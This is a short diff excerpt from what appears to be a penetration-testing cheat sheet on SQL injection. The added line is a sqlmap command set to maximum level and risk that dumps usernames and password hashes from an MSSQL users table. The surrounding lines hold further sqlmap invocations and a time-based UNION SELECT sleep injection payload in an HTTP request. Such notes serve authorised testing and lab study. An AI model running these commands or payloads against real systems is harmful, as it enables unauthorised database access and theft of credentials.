@@ -1118,6 +1118,8 @@ SELECT * FROM information_schema.tables
 ./sqlmap.py -r search-test.txt -p tfUPass  #<-p> is the parameter to test in the file
 [From Burp to confirm] POST /issue/checkByPriority?priority=Normal'+UNION+SELECT+sleep(5);+--+- HTTP/1.1
 
+sqlmap -r post.login.req --threads=1 --time-sec=1 --level=5 --risk=3 --dbms=mssql -T users -C username,password_hash --random-agent --batch --dump
+
 # Get
 sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql
 
